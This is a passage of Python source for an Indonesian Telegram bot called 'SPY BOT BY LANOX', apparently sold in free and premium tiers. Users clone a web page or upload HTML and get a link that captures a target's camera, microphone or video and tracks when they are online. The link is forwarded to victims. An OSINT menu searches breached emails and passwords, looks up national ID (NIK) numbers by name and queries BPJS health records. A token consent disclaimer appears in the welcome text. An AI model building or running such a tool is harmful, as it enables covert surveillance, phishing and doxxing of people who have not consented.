        _user_state[uid] = "osint_breach"
        await q.edit_message_text("🔓 *Breach Check*\n\nKetik email target:", parse_mode="Markdown")

    elif d == "o_bocor":
        _user_state[uid] = None
        await q.edit_message_text(
            "💧 *Cek Data Bocor — MR414N-ID*\n\nPilih jenis data:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📧 Email", callback_data="bocor_email"),
                 InlineKeyboardButton("👤 Username", callback_data="bocor_username")],
                [InlineKeyboardButton("📱 Nomor HP", callback_data="bocor_phone"),
                 InlineKeyboardButton("🪪 NIK", callback_data="bocor_nik")],
                [InlineKeyboardButton("🔑 Password", callback_data="bocor_password")],
                [InlineKeyboardButton("« Kembali", callback_data="osint_menu")],
            ]))

    elif d in ("bocor_email","bocor_username","bocor_phone","bocor_nik","bocor_password"):
        kind = d.replace("bocor_", "")
        _user_state[uid] = f"bocor_await_{kind}"
        lbl = {"email":"Email","username":"Username","phone":"Nomor HP","nik":"NIK","password":"Password"}[kind]
        await q.edit_message_text(
            f"💧 *Cek Data Bocor — {lbl}*\n\nKetik yang mau dicek:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Batal", callback_data="o_bocor")]]))

    elif d == "o_phone":
        _user_state[uid] = "osint_phone"
        await q.edit_message_text("📱 *Phone Lookup*\n\nKetik nomor HP (contoh: 08xxxxxxxxxx):", parse_mode="Markdown")

    elif d == "o_profile":
        _user_state[uid] = "osint_profile"
        await q.edit_message_text("🧑 *Profile Scraper*\n\nKetik username (GitHub dll):", parse_mode="Markdown")

    elif d == "o_dork":
        _user_state[uid] = "osint_dork"
        await q.edit_message_text("🌐 *Google Dorking*\n\nKetik username atau nama target:", parse_mode="Markdown")

    elif d == "o_wayback":
        _user_state[uid] = "osint_wayback"
        await q.edit_message_text("🕰 *Wayback Check*\n\nKetik username:", parse_mode="Markdown")

    elif d == "o_nik":
        _user_state[uid] = "osint_nik"
        await q.edit_message_text("🪪 *NIK Search*\n\nKetik nama lengkap target:", parse_mode="Markdown")

    elif d == "o_bpjs":
        _user_state[uid] = "osint_bpjs_nik"
        await q.edit_message_text("🏥 *BPJS Search*\n\nKetik NIK:", parse_mode="Markdown")

    elif d == "o_full":
        _user_state[uid] = "osint_full_username"
        _user_data[uid] = {}
        await q.edit_message_text(
            "🕵️ *Full OSINT*\n\nKetik username (Enter skip ketik `-`):",
            parse_mode="Markdown")

    # ============================================================
    #  SPY — TAMBAH LINK
    # ============================================================
    elif d == "add_link":
        if role == "free" and db_link_count(uid) >= FREE_LIMIT:
            await q.answer(f"❌ Batas {FREE_LIMIT} link untuk Free.", show_alert=True); return
        last = _last_add.get(uid, 0)
        sisa = RATE_LIMIT_SEC - int(time.time() - last)
        if sisa > 0 and role != "admin":
            await q.answer(f"⏳ Tunggu {sisa} detik.", show_alert=True); return
        _user_state[uid] = "await_template"; _user_data[uid] = {}
        await q.edit_message_text("Pilih template:", reply_markup=kb_template())

    elif d == "tmpl_url":
        _user_state[uid] = "await_url"
        await q.edit_message_text("Ketik URL yang mau di-clone:")

    elif d == "tmpl_html":
        _user_state[uid] = "await_html"
        await q.edit_message_text("Kirim file `.html` sekarang.")

    elif d in ("mode_cam", "mode_mic", "mode_video"):
        raw = _user_data.get(uid, {}).get("raw_html", "")
        if not raw:
            await q.edit_message_text("❌ Template kosong.", reply_markup=kb_main(uid)); return
        mode = d.replace("mode_", "")
        await spawn_link("cf", raw, uid, q, mode=mode)
        _user_state[uid] = None

    elif d == "custom_yes":
        _user_state[uid] = "await_alias"
        await q.edit_message_text("Ketik alias yang diinginkan:\n(contoh: spylanox)")

    elif d == "custom_no":
        pub_url = _user_data.get(uid, {}).get("pending_pub_url", "")
        lid = _user_data.get(uid, {}).get("pending_link_id", "?")
        _user_data[uid] = {}
        await q.edit_message_text(
            f"✅ *Link #{lid} aktif!*\n\n🔗 `{pub_url}`\n\nForward ke target.",
            parse_mode="Markdown", reply_markup=kb_main(uid))

    elif d == "list_links":
        user_links = [l for l in _links if str(l["owner"]) == uid]
        if not user_links:
            await q.edit_message_text("📋 Belum ada link.", reply_markup=kb_main(uid))
        else:
            teks = "📋 *Link Aktif:*\n\n"
            for lnk in user_links:
                cap = _cap_counts.get(lnk["id"], 0)
                mode_icon = {"mic": "🎤", "video": "🎥"}.get(lnk.get("mode", "cam"), "📷")
                teks += f"{mode_icon} Link #{lnk['id']} ({cap} cap)\n`{lnk['pub_url']}`\n\n"
            await q.edit_message_text(teks, parse_mode="Markdown", reply_markup=kb_main(uid))

    elif d == "online_now":
        now = time.time(); teks = "👁 *Target Online:*\n\n"; found = False
        for lnk in [l for l in _links if str(l["owner"]) == uid]:
            online = [ip for ip, ts in _active_targets.get(lnk["id"], {}).items() if now - ts < 15]
            if online:
                found = True; teks += f"Link #{lnk['id']}: {len(online)} target\n"
        if not found: teks += "Tidak ada target online."
        await q.edit_message_text(teks, parse_mode="Markdown", reply_markup=kb_main(uid))

    elif d == "del_link":
        user_links = [l for l in _links if str(l["owner"]) == uid]
        if not user_links:
            await q.edit_message_text("Belum ada link.", reply_markup=kb_main(uid))
        else:
            await q.edit_message_text("Pilih link yang mau dihapus:", reply_markup=kb_del(uid))

    elif d.startswith("delid_"):
        lid = int(d.split("_")[1])
        for i, lnk in enumerate(_links):
            if lnk["id"] == lid and str(lnk["owner"]) == uid:
                if lnk.get("proc"):
                    try: lnk["proc"].terminate()
                    except: pass
                _links.pop(i); _page_htmls.pop(lid, None); break
        await q.edit_message_text(f"✅ Link #{lid} dihapus.", reply_markup=kb_main(uid))

    # ============================================================
    #  ADMIN
    # ============================================================
    elif d == "admin_panel":
        if role != "admin":
            await q.answer("❌ Bukan admin.", show_alert=True); return
        await q.edit_message_text("👑 *Panel Admin:*", parse_mode="Markdown", reply_markup=kb_admin())

    elif d == "a_stats":
        if role != "admin": return
        s = db_get_stats(); online = get_online_count()
        teks = (f"📊 *Statistik:*\n\n👥 Total user: {s['total_users']}\n"
                f"👑 Admin: {s['roles'].get('admin',0)}\n💎 Premium: {s['roles'].get('premium',0)}\n"
                f"🆓 Free: {s['roles'].get('free',0)}\n🔗 Link aktif: {s['total_links']}\n"
                f"📸 Total capture: {s['total_cap']}\n👁 Target online: {online}\n⏱ Uptime: {format_uptime()}")
        await q.edit_message_text(teks, parse_mode="Markdown", reply_markup=kb_admin())

    elif d == "a_users":
        if role != "admin": return
        users = db_all_users()
        teks = "👥 *Semua User:*\n\n"
        for u_id, ud in list(users.items())[:30]:
            r2 = ud.get("role","free")
            badge = {"admin":"👑","premium":"💎","free":"🆓"}.get(r2,"🆓")
            teks += f"{badge} `{u_id}` — {ud.get('cap_total',0)} cap\n"
        await q.edit_message_text(teks, parse_mode="Markdown", reply_markup=kb_admin())

    elif d == "a_alllinks":
        if role != "admin": return
        if not _links:
            await q.edit_message_text("Belum ada link aktif.", reply_markup=kb_admin()); return
        teks = "🔗 *Semua Link Aktif:*\n\n"
        for lnk in _links:
            cap = _cap_counts.get(lnk["id"], 0)
            teks += f"Link #{lnk['id']} | Owner: `{lnk['owner']}` | {cap} cap\n`{lnk['pub_url']}`\n\n"
        await q.edit_message_text(teks, parse_mode="Markdown", reply_markup=kb_admin())

    elif d == "a_upgrade":
        if role != "admin": return
        _user_state[uid] = "a_await_upgrade_id"
        await q.edit_message_text("Ketik ID user yang mau di-upgrade:")

    elif d.startswith("a_dur_"):
        if role != "admin": return
        key = d.replace("a_dur_","")
        label, days = PREMIUM_DURATIONS.get(key, ("?", None))
        target = _user_data.get(uid, {}).get("upgrade_target","")
        until = None if days is None else (datetime.datetime.now() + datetime.timedelta(days=days)).strftime("%Y-%m-%d")
        db_set_role(target, "premium", until=until)
        exp_str = f"sampai `{until}`" if until else "Permanent ♾"
        await q.edit_message_text(f"✅ `{target}` upgrade Premium {label} ({exp_str}).",
                                  parse_mode="Markdown", reply_markup=kb_admin())
        _user_data[uid] = {}

    elif d == "a_downgrade":
        if role != "admin": return
        _user_state[uid] = "a_await_downgrade"
        await q.edit_message_text("Ketik ID user yang mau di-downgrade:")

    elif d == "a_ban":
        if role != "admin": return
        _user_state[uid] = "a_await_ban"
        await q.edit_message_text("Ketik ID user yang mau di-ban:")

    elif d == "a_unban":
        if role != "admin": return
        _user_state[uid] = "a_await_unban"
        await q.edit_message_text("Ketik ID user yang mau di-unban:")

    elif d == "a_addadmin":
        if role != "admin": return
        _user_state[uid] = "a_await_addadmin"
        await q.edit_message_text("Ketik ID user yang mau dijadikan Admin:")

    elif d == "a_deladmin":
        if role != "admin": return
        _user_state[uid] = "a_await_deladmin"
        await q.edit_message_text("Ketik ID admin yang mau dicopot:")

    elif d == "a_forcelink":
        if role != "admin": return
        _user_state[uid] = "a_await_forcelink"
        await q.edit_message_text("Ketik nomor Link ID yang mau dihapus:")

    elif d == "a_msg":
        if role != "admin": return
        _user_state[uid] = "a_await_msg_id"
        await q.edit_message_text("Ketik ID user yang mau dikirim pesan:")

    elif d == "a_broadcast":
        if role != "admin": return
        _user_state[uid] = "a_await_broadcast"
        await q.edit_message_text("Ketik pesan broadcast:")

    elif d == "a_stop":
        if role != "admin": return
        await q.edit_message_text("🛑 *Server dihentikan.*", parse_mode="Markdown")
        await asyncio.sleep(1)
        global _timer_running; _timer_running = False
        os.kill(os.getpid(), signal.SIGINT)

# ================================================================== #
#  HANDLERS — MESSAGE
# ================================================================== #
async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    state = _user_state.get(uid)
    text = update.message.text.strip() if update.message.text else ""

    if not state:
        # keyboard bawah
        if text == "➕ Tambah Link":
            if db_is_banned(uid): return
            db_ensure_user(uid); role = db_get_role(uid)
            if role == "free" and db_link_count(uid) >= FREE_LIMIT:
                await update.message.reply_text(f"❌ Batas {FREE_LIMIT} link."); return
            last = _last_add.get(uid, 0)
            sisa = RATE_LIMIT_SEC - int(time.time() - last)
            if sisa > 0 and role != "admin":
                await update.message.reply_text(f"⏳ Tunggu {sisa} detik."); return
            _user_state[uid] = "await_template"; _user_data[uid] = {}
            await update.message.reply_text("Pilih template:", reply_markup=kb_template())
        elif text == "📋 Daftar Link":
            user_links = [l for l in _links if str(l["owner"]) == uid]
            if not user_links:
                await update.message.reply_text("📋 Belum ada link aktif.")
            else:
                teks = "📋 *Link Aktif:*\n\n"
                for lnk in user_links:
                    cap = _cap_counts.get(lnk["id"], 0)
                    teks += f"📷 Link #{lnk['id']} ({cap} cap)\n`{lnk['pub_url']}`\n\n"
                await update.message.reply_text(teks, parse_mode="Markdown")
        elif text == "🗑 Hapus Link":
            user_links = [l for l in _links if str(l["owner"]) == uid]
            if not user_links:
                await update.message.reply_text("Belum ada link.")
            else:
                await update.message.reply_text("Pilih link:", reply_markup=kb_del(uid))
        elif text == "📖 Tutorial":
            await update.message.reply_text(TUTORIAL_TEXT, parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Kembali", callback_data="back_main")]]))
        elif text == "🔍 OSINT Tools":
            db_ensure_user(uid)
            await update.message.reply_text(
                "🔍 *OSINT Tools — MR414N-ID*\n\nPilih fitur:",
                parse_mode="Markdown", reply_markup=kb_osint())
        elif text == "👑 Panel Admin":
            if db_get_role(uid) != "admin":
                await update.message.reply_text("❌ Bukan admin."); return
            await update.message.reply_text("👑 *Panel Admin:*", parse_mode="Markdown", reply_markup=kb_admin())
        else:
            await update.message.reply_text(
                "👋 WELCOME TO SPY BOT BY LANOX\n\n"
                "🕵️ Selamat datang di SPY BOT, platform pemantauan dan pelacakan digital.\n\n"
                "📡 FITUR BOT:\n"
                "📷 Monitoring Kamera\n"
                "📍 Pelacakan Lokasi\n"
                "🔗 Sistem Berbasis Link\n\n"
                "🔐 AKSES MEMBER\n"
                "Bot ini hanya dapat digunakan oleh member yang telah terdaftar.\n\n"
                "🎁 FREE ACCESS\n"
                "• Limit penggunaan: 3 Link\n"
                "• Upgrade Premium untuk mendapatkan limit lebih besar.\n\n"
                "🚀 MULAI SEKARANG\n"
                "👉 Ketik /start untuk memulai.\n\n"
                "⚠️ Gunakan seluruh fitur hanya pada perangkat dan lokasi yang Anda miliki atau dengan persetujuan pemiliknya.\n\n"
                "🔥 SPY BOT BY LANOX\n"
                "Smart Monitoring • Digital Tracking"
            )
        return

    # ============================================================
    #  STATE — OSINT
    # ============================================================
    if state == "osint_username":
        username = text.lstrip("@")
        _user_state[uid] = None
        threading.Thread(target=run_osint_username,
                         args=(uid, username, BOT_TOKEN), daemon=True).start()

    elif state == "osint_breach":
        _user_state[uid] = None
        threading.Thread(target=run_osint_breach,
                         args=(uid, text, BOT_TOKEN), daemon=True).start()

    elif state == "osint_phone":
        _user_state[uid] = None
        threading.Thread(target=run_osint_phone,
                         args=(uid, text, BOT_TOKEN), daemon=True).start()

    elif state == "osint_profile":
        _user_state[uid] = None
        threading.Thread(target=run_osint_profile,
                         args=(uid, text.lstrip("@"), BOT_TOKEN), daemon=True).start()

    elif state == "osint_dork":
        _user_state[uid] = None
        threading.Thread(target=run_osint_dork,
                         args=(uid, text, BOT_TOKEN), daemon=True).start()

    elif state == "osint_wayback":
        _user_state[uid] = None
        threading.Thread(target=run_osint_wayback,
                         args=(uid, text.lstrip("@"), BOT_TOKEN), daemon=True).start()

    elif state == "osint_nik":
        _user_state[uid] = None
        threading.Thread(target=run_osint_nik,
                         args=(uid, text, "", BOT_TOKEN), daemon=True).start()

    elif state == "osint_bpjs_nik":
        _user_data[uid]["bpjs_nik"] = text
        _user_state[uid] = "osint_bpjs_tgl"
        await update.message.reply_text("Ketik tanggal lahir (DD-MM-YYYY):")

    elif state == "osint_bpjs_tgl":
        nik = _user_data[uid].get("bpjs_nik", "")
        _user_state[uid] = None; _user_data[uid] = {}
        threading.Thread(target=run_osint_bpjs,
                         args=(uid, nik, text, BOT_TOKEN), daemon=True).start()

    elif state == "osint_full_username":
        _user_data[uid]["full_username"] = "" if text == "-" else text
        _user_state[uid] = "osint_full_email"
        await update.message.reply_text("Ketik email (atau `-` skip):")

    elif state == "osint_full_email":
        _user_data[uid]["full_email"] = "" if text == "-" else text
        _user_state[uid] = "osint_full_nomor"
        await update.message.reply_text("Ketik nomor HP (atau `-` skip):")

    elif state == "osint_full_nomor":
        _user_data[uid]["full_nomor"] = "" if text == "-" else text
        d = _user_data[uid]; _user_state[uid] = None; _user_data[uid] = {}
        threading.Thread(target=run_osint_full,
                         args=(uid, d.get("full_username",""), d.get("full_email",""),
                               d.get("full_nomor",""), BOT_TOKEN), daemon=True).start()

    # ============================================================
    #  STATE — CEK DATA BOCOR
    # ============================================================
    elif state and state.startswith("bocor_await_"):
        kind = state.replace("bocor_await_", "")
        _user_state[uid] = None
        cfg = {"leaklookup": LEAKLOOKUP_KEY, "abstractapi": ABSTRACTAPI_KEY}
        threading.Thread(target=run_bocor,
                         args=(uid, text, kind, BOT_TOKEN, cfg), daemon=True).start()

    # ============================================================
    #  STATE — SPY
    # ============================================================
    elif state == "await_alias":
        alias = re.sub(r"[^a-zA-Z0-9\-_]", "", text)
        if len(alias) < 3:
            await update.message.reply_text("❌ Alias minimal 3 karakter."); return
        pub_url = _user_data.get(uid, {}).get("pending_pub_url", "")
        lid = _user_data.get(uid, {}).get("pending_link_id", "?")
        await update.message.reply_text(f"⏳ Custom link '{alias}'...")
        final = await try_shorten(pub_url, alias)
        _user_data[uid] = {}; _user_state[uid] = None
        teks = (f"✅ *Link #{lid} aktif!*\n\n🔗 Custom: `{final}`\n🔗 Asli: `{pub_url}`"
                if final != pub_url else
                f"✅ *Link #{lid} aktif!*\n\n🔗 `{pub_url}`\n_(Custom gagal)_")
        await update.message.reply_text(teks, parse_mode="Markdown", reply_markup=kb_main(uid))

    elif state == "await_url":
        url = text if text.startswith("http") else "https://" + text
        await update.message.reply_text(f"⏳ Cloning {url}...")
        try:
            raw = clone_url(url)
            _user_data[uid]["raw_html"] = raw; _user_state[uid] = "await_mode"
            await update.message.reply_text("✅ Clone berhasil!\n\nPilih mode:", reply_markup=kb_mode())
        except Exception as e:
            await update.message.reply_text(f"❌ Gagal: {e}", reply_markup=kb_template())

    # --- admin states ---
    elif state == "a_await_upgrade_id":
        _user_data[uid]["upgrade_target"] = text; _user_state[uid] = None
        rows = []
        row = []
        for key, (label, days) in PREMIUM_DURATIONS.items():
            row.append(InlineKeyboardButton(label, callback_data=f"a_dur_{key}"))
            if len(row) == 2: rows.append(row); row = []
        if row: rows.append(row)
        rows.append([InlineKeyboardButton("« Kembali", callback_data="admin_panel")])
        await update.message.reply_text(f"Pilih durasi untuk `{text}`:",
                                        parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(rows))

    elif state == "a_await_downgrade":
        db_set_role(text, "free"); _user_state[uid] = None
        await update.message.reply_text(f"✅ `{text}` di-downgrade.", parse_mode="Markdown", reply_markup=kb_admin())

    elif state == "a_await_ban":
        db_ban(text); _user_state[uid] = None
        await update.message.reply_text(f"🚫 `{text}` dibanned.", parse_mode="Markdown", reply_markup=kb_admin())

    elif state == "a_await_unban":
        db_unban(text); _user_state[uid] = None
        await update.message.reply_text(f"✅ `{text}` di-unban.", parse_mode="Markdown", reply_markup=kb_admin())

    elif state == "a_await_addadmin":
        db_add_admin(text); _user_state[uid] = None
        await update.message.reply_text(f"✅ `{text}` jadi Admin.", parse_mode="Markdown", reply_markup=kb_admin())

    elif state == "a_await_deladmin":
        ok = db_remove_admin(text); _user_state[uid] = None
        msg = f"✅ `{text}` dicopot." if ok else "❌ Tidak bisa hapus admin utama."
        await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=kb_admin())

    elif state == "a_await_forcelink":
        try:
            lid = int(text)
            for i, lnk in enumerate(_links):
                if lnk["id"] == lid:
                    if lnk.get("proc"):
                        try: lnk["proc"].terminate()
                        except: pass
                    _links.pop(i); _page_htmls.pop(lid, None); break
            await update.message.reply_text(f"✅ Link #{lid} dihapus paksa.", reply_markup=kb_admin())
        except Exception:
            await update.message.reply_text("❌ ID tidak valid.", reply_markup=kb_admin())
        _user_state[uid] = None

    elif state == "a_await_msg_id":
        _user_data[uid]["msg_target"] = text; _user_state[uid] = "a_await_msg_text"
        await update.message.reply_text(f"Ketik pesan untuk `{text}`:", parse_mode="Markdown")

    elif state == "a_await_msg_text":
        target = _user_data[uid].get("msg_target","")
        try:
            await Bot(token=BOT_TOKEN).send_message(chat_id=target,
                text=f"📩 *Pesan dari Admin:*\n\n{text}", parse_mode="Markdown")
            await update.message.reply_text("✅ Pesan terkirim.", reply_markup=kb_admin())
        except Exception as e:
            await update.message.reply_text(f"❌ Gagal: {e}", reply_markup=kb_admin())
        _user_state[uid] = None; _user_data[uid] = {}

    elif state == "a_await_broadcast":
        users = db_all_users(); bot = Bot(token=BOT_TOKEN); ok = 0; fail = 0
        for u_id in users:
            try:
                await bot.send_message(chat_id=u_id,
                    text=f"📢 *Broadcast:*\n\n{text}", parse_mode="Markdown")
                ok += 1
            except: fail += 1
        await update.message.reply_text(f"📢 Broadcast selesai.\n✅ {ok} | ❌ {fail}", reply_markup=kb_admin())
        _user_state[uid] = None

async def on_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    state = _user_state.get(uid)
    if state != "await_html": return
    doc = update.message.document
    if not doc.file_name.endswith(".html"):
        await update.message.reply_text("❌ Harus file .html"); return
    await update.message.reply_text("⏳ Memproses file...")
    try:
        tfile = await context.bot.get_file(doc.file_id)
        raw = (await tfile.download_as_bytearray()).decode("utf-8", errors="replace")
        _user_data[uid]["raw_html"] = raw; _user_state[uid] = "await_mode"
        await update.message.reply_text("✅ File diterima!\n\nPilih mode:", reply_markup=kb_mode())
    except Exception as e:
        await update.message.reply_text(f"❌ Gagal: {e}")

# ================================================================== #
#  MAIN
# ================================================================== #
def main():
    print_banner()
    threading.Thread(target=timer_thread, daemon=True).start()
    print(f"\n\n  Buka @bot → /start\n")
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CallbackQueryHandler(on_button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_message))
    app.add_handler(MessageHandler(filters.Document.ALL, on_document))
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
